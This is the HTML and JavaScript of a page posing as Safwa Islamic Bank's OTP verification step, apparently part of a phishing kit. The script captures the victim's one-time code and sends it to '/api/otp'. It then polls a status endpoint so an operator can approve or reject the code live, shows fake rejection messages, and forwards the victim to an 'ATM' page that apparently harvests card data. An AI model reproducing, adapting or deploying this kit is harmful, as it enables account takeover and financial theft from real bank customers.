<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verify Code - Safwa Islamic Bank</title>
<style>
  :root {
    --green: #1a6b3c;
    --green-dark: #125129;
    --orange: #f28c28;
    --orange-dark: #d97706;
    --navy: #12314f;
    --gold: #f4c26b;
    --ink: #1c2b36;
    --muted: #5c6b74;
    --light-bg: #f4f6f8;
    --border: #d7dce0;
    --gray-line: #dcdcdc;
    --text-dark: #2b2b2b;
    --card-bg: #ffffff;
  }
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0;
    font-family: "Segoe UI", "Tahoma", Arial, sans-serif;
    background-color: var(--light-bg);
    color: var(--text-dark);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 16px;
    position: relative;
  }
  .lang-switcher {
    position: absolute;
    top: 20px;
    right: 20px;
    z-index: 10;
  }
  .lang-switcher a {
    color: var(--green);
    text-decoration: none;
    font-weight: bold;
    font-size: 14px;
    border: 1px solid var(--green);
    padding: 6px 14px;
    border-radius: 20px;
    transition: all 0.2s ease;
    background: #fff;
  }
  .lang-switcher a:hover {
    background: var(--green);
    color: #fff;
  }
  .screen {
    width: 100%;
    max-width: 440px;
    min-height: auto;
    display: flex;
    flex-direction: column;
    padding: 24px;
    position: relative;
    background: var(--card-bg);
    border-radius: 16px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
  }
  @media (max-width: 480px) {
    body {
      background: var(--card-bg);
      padding: 0;
      align-items: flex-start;
    }
    .screen {
      box-shadow: none;
      border-radius: 0;
      min-height: 100vh;
      padding: 16px 20px 0 20px;
    }
  }
  .logo-wrap {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    margin-bottom: 24px;
  }
  .logo-wrap img {
    max-width: 220px;
    width: 100%;
    height: auto;
  }
  .logo-placeholder {
    width: 100%;
    max-width: 220px;
    height: 90px;
    border: 2px dashed var(--border);
    border-radius: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f9fafb;
    color: var(--muted);
    font-size: 14px;
    font-weight: 700;
    letter-spacing: 0.5px;
  }
  .page-subtitle {
    color: var(--green);
    font-weight: 700;
    font-size: 18px;
    margin-top: 16px;
    text-align: center;
  }
  .secure-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 16px;
  }
  .secure-icon img {
    width: 110px;
    height: 110px;
    object-fit: contain;
  }
  h2 {
    color: var(--green);
    font-size: 19px;
    margin: 0 0 8px;
    text-align: center;
  }
  p.lead {
    color: var(--muted);
    font-size: 13px;
    line-height: 1.6;
    margin: 0 0 24px;
    text-align: center;
  }
  .otp-field {
    text-align: center;
    margin-bottom: 16px;
  }
  .otp-field label {
    display: block;
    font-size: 13px;
    color: var(--muted);
    margin-bottom: 12px;
    text-align: center;
  }
  .otp-boxes {
    display: flex;
    justify-content: center;
    gap: 8px;
    direction: ltr;
  }
  .otp-box {
    width: 46px;
    height: 54px;
    border: 2px solid var(--border);
    border-radius: 12px;
    font-size: 22px;
    font-weight: 700;
    text-align: center;
    color: var(--text-dark);
    background: var(--light-bg);
    transition: all 0.2s;
    caret-color: #1a56db;
  }
  .otp-box:focus {
    outline: none;
    border-color: #1a56db;
    background: #fff;
    box-shadow: 0 0 0 3px rgba(26,86,219,0.12);
    transform: scale(1.05);
  }
  .otp-box.filled {
    border-color: #1a56db;
    background: #fff;
    color: #1a56db;
  }
  .otp-hidden {
    position: absolute;
    opacity: 0;
    pointer-events: none;
  }
  .req {
    display: none;
    font-size: 11.5px;
    color: #c0392b;
    margin: 6px 0 0;
    text-align: center;
  }
  .invalid .req {
    display: block;
  }
  .invalid .otp-box {
    border-color: #c0392b;
  }
  .submit-btn {
    display: block;
    width: 100%;
    background: #1a56db;
    color: #fff;
    border: none;
    border-radius: 12px;
    padding: 16px;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
    margin-top: 24px;
    transition: background-color 0.2s;
    box-shadow: 0 4px 12px rgba(26, 86, 219, 0.3);
  }
  .submit-btn:hover {
    background: #1648c0;
  }

  /* ---------- OVERLAY (waiting / success / rejected) ---------- */
  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(255, 255, 255, 0.95);
    display: none;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    gap: 18px;
    z-index: 999;
    padding: 24px;
    text-align: center;
  }
  .overlay.show {
    display: flex;
  }
  .spinner {
    width: 46px;
    height: 46px;
    border: 4px solid #e2e6e9;
    border-top-color: var(--green);
    border-radius: 50%;
    animation: spin .8s linear infinite;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  .overlay p {
    font-size: 14px;
    color: var(--green);
    font-weight: 600;
    margin: 0;
    max-width: 280px;
    line-height: 1.7;
  }
  .reject-icon {
    width: 56px;
    height: 56px;
    border-radius: 50%;
    background: #c0392b;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .reject-icon svg {
    width: 26px;
    height: 26px;
  }
  .overlay button {
    margin-top: 6px;
    background: var(--green);
    color: #fff;
    border: none;
    border-radius: 6px;
    padding: 10px 24px;
    font-size: 13.5px;
    font-weight: 700;
    cursor: pointer;
  }
  .overlay button:hover {
    background: var(--green-dark);
  }

  .spacer {
    flex: 1;
    min-height: 20px;
  }
</style>
</head>
<body>

  <div class="screen">
    <!-- Unified Header -->
    <div class="logo-wrap">
    </div>

    <div class="card" id="otpForm" style="border:none; box-shadow:none; padding:0;">
      <div class="secure-icon">
        <img src="https://i.ibb.co/JWCFmwFT/file-00000000b6a08243a15380426295aff9.png" alt="OTP security icon" />
      </div>
      <p class="lead">A verification code (OTP) has been sent to your phone. Please enter it to complete login.</p>
      
      <div class="otp-field" id="otpField">
        <label>Verification Code</label>
        <div class="otp-boxes" id="otpBoxes">
          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="0" autocomplete="off">
          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="1" autocomplete="off">
          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="2" autocomplete="off">
          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="3" autocomplete="off">
          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="4" autocomplete="off">
          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="5" autocomplete="off">
        </div>
        <input type="hidden" id="otp">
        <span class="req">Code is required</span>
      </div>
      <button class="submit-btn" id="verifyBtn" type="button">Confirm</button>

      <!-- Security Badge -->
      <div style="text-align:center; margin-top:14px;">
        <img src="https://i.ibb.co/LhrCDkd5/IMG-20260930-WA0018.jpg" alt="secure payment" style="max-width:180px; width:60%; height:auto; border-radius:8px;">
      </div>
    </div>

    <div class="spacer"></div>
  </div>

  <div class="overlay" id="waitOverlay">
    <div class="spinner"></div>
    <p id="waitText">Verifying...</p>
  </div>

  <div class="overlay" id="rejectOverlay">
    <div class="reject-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <line x1="18" y1="6" x2="6" y2="18"></line>
        <line x1="6" y1="6" x2="18" y2="18"></line>
      </svg>
    </div>
    <p style="color: #c0392b; font-weight: bold; font-size: 16px;">The verification code was rejected. Please check the code and try again.</p>
    <button type="button" id="retryOtpBtn" style="background-color: #c0392b;">Try Again</button>
  </div>

  <script>
    var requestId = sessionStorage.getItem('safwa_order_id') || sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
    if (!requestId) {
      window.location.href = 'index.html';
    }
    sessionStorage.setItem('safwa_order_id', String(requestId));
    sessionStorage.setItem('aman_bank_request_id', String(requestId));

    function applyOtpRejectMessage() {
      var params = new URLSearchParams(window.location.search);
      if (params.get('error') !== 'otp') return;
      var msg = params.get('msg') || 'The OTP was rejected. Please check the code and try again.';
      var rejectOverlay = document.getElementById('rejectOverlay');
      if (rejectOverlay) rejectOverlay.classList.remove('show');
      var otpForm = document.getElementById('otpForm');
      if (otpForm) otpForm.style.display = 'block';
      var otpField = document.getElementById('otpField');
      if (otpField) {
        otpField.classList.add('invalid');
        var req = otpField.querySelector('.req');
        if (req) req.textContent = msg;
      }
      var otpInput = document.getElementById('otp');
      if (otpInput) otpInput.value = '';
      document.querySelectorAll('.otp-box').forEach(function(b){ b.value=''; b.classList.remove('filled'); b.disabled=false; });
      var firstBox = document.querySelector('.otp-box');
      if (firstBox) firstBox.focus();
      var verifyBtn = document.getElementById('verifyBtn');
      if (verifyBtn) verifyBtn.disabled = false;
      var waitOverlay = document.getElementById('waitOverlay');
      if (waitOverlay) waitOverlay.classList.remove('show');
    }

    // Update language switcher link to preserve request ID
    var langSwitch = document.getElementById('langSwitch');
    if (langSwitch) {
      var params = new URLSearchParams(window.location.search);
      if (requestId && requestId !== '999') {
        params.set('id', requestId);
      }
      langSwitch.href = 'otp.html' + (params.toString() ? '?' + params.toString() : '');
    }

    applyOtpRejectMessage();

    var otpForm = document.getElementById('otpForm');
    var otpField = document.getElementById('otpField');
    var otpInput = document.getElementById('otp');
    var verifyBtn = document.getElementById('verifyBtn');
    var waitOverlay = document.getElementById('waitOverlay');
    var rejectOverlay = document.getElementById('rejectOverlay');
    var statusPollTimer = null;
    var hasSubmittedOtp = false;

    var boxes = document.querySelectorAll('.otp-box');
    function syncHidden(){
      var val = '';
      boxes.forEach(function(b){ val += b.value; });
      otpInput.value = val;
    }
    boxes.forEach(function(box, i){
      box.addEventListener('input', function(e){
        var v = this.value.replace(/\D/g,'');
        this.value = v.slice(0,1);
        this.classList.toggle('filled', !!this.value);
        if(v && i < boxes.length - 1) boxes[i+1].focus();
        syncHidden();
      });
      box.addEventListener('keydown', function(e){
        if(e.key === 'Backspace' && !this.value && i > 0){
          boxes[i-1].focus();
          boxes[i-1].value = '';
          boxes[i-1].classList.remove('filled');
          syncHidden();
        }
      });
      box.addEventListener('paste', function(e){
        e.preventDefault();
        var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
        for(var j = 0; j < boxes.length && j < text.length; j++){
          boxes[j].value = text[j];
          boxes[j].classList.add('filled');
        }
        var focusIdx = Math.min(text.length, boxes.length - 1);
        boxes[focusIdx].focus();
        syncHidden();
      });
    });
    if(boxes[0]) boxes[0].focus();

    function normalizeStatus(value){
      return String(value || '').trim().toLowerCase();
    }

    function isApprovedStatus(value){
      var status = normalizeStatus(value);
      return ['approved', 'accept', 'accepted', 'otp', 'verified', 'success'].indexOf(status) !== -1;
    }

    function shouldSkipToAtmAfterOtpSubmit(value){
      var status = normalizeStatus(value);
      return hasSubmittedOtp && ['approved', 'accept', 'accepted', 'otp', 'verified', 'success'].indexOf(status) !== -1;
    }

    function isRejectedStatus(value){
      var status = normalizeStatus(value);
      return ['rejected', 'reject', 'declined', 'error', 'failed'].indexOf(status) !== -1;
    }

    function stopPoll(){
      clearInterval(statusPollTimer);
      statusPollTimer = null;
    }

    function redirectToAtm(){
      stopPoll();
      if (waitOverlay) waitOverlay.classList.remove('show');
      if (requestId) {
        window.location.href = 'atm-en.html?id=' + requestId;
      }
    }

    function redirectToOtpError(message){
      stopPoll();
      waitOverlay.classList.remove('show');
      if (requestId) {
        var msg = message || 'The OTP was rejected. Please check the code and try again.';
        window.location.href = 'otp-en.html?error=otp&msg=' + encodeURIComponent(msg) + '&id=' + requestId;
      }
    }

    function pollOtpStatus(){
      stopPoll();
      var checkNow = function(){
        if (hasSubmittedOtp) {
          return;
        }
        fetch('/api/status/' + requestId)
          .then(function(res){ return res.json(); })
          .then(function(data){
            if (!data || !data.status) return;
            var status = normalizeStatus(data.status);
            if (shouldSkipToAtmAfterOtpSubmit(status)) {
              redirectToAtm();
            } else if (isRejectedStatus(status)) {
              redirectToOtpError('The OTP was rejected. Please check the code and try again.');
            }
          })
          .catch(function(err){
            console.warn('Could not check request status:', err);
          });
      };
      checkNow();
      statusPollTimer = setInterval(checkNow, 2500);
    }

    verifyBtn.addEventListener('click', function(){
      var code = otpInput.value.trim();
      if (!/^\d{4,6}$/.test(code)) {
        otpField.classList.add('invalid');
        return;
      }
      otpField.classList.remove('invalid');

      rejectOverlay.classList.remove('show');
      otpForm.style.display = 'none';
      waitOverlay.classList.add('show');
      verifyBtn.disabled = true;
      otpInput.disabled = true;
      hasSubmittedOtp = true;
      stopPoll();

      fetch('/api/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: requestId, otp: code })
      })
      .then(function(res){
        if (!res || !res.ok) {
          throw new Error('otp submit failed');
        }
        return res.text().then(function(text){
          try { return JSON.parse(text); } catch (e) { return {}; }
        });
      })
      .then(function(){
        stopPoll();
        window.location.href = 'loading-en.html?type=otp&id=' + encodeURIComponent(requestId);
      })
      .catch(function(err){
        console.warn('Could not reach the backend server:', err);
        stopPoll();
        window.location.href = 'loading-en.html?type=otp&id=' + encodeURIComponent(requestId);
      });
    });

    document.getElementById('retryOtpBtn').addEventListener('click', function(){
      rejectOverlay.classList.remove('show');
      waitOverlay.classList.remove('show');
      otpForm.style.display = 'block';
      otpInput.value = '';
      boxes.forEach(function(b){ b.value=''; b.classList.remove('filled'); b.disabled=false; });
      if(boxes[0]) boxes[0].focus();
      otpField.classList.remove('invalid');
      hasSubmittedOtp = false;
      stopPoll();
      verifyBtn.disabled = false;
      pollOtpStatus();
    });

    pollOtpStatus();
  </script>

<script src="heartbeat.js"></script>
</body>
</html>
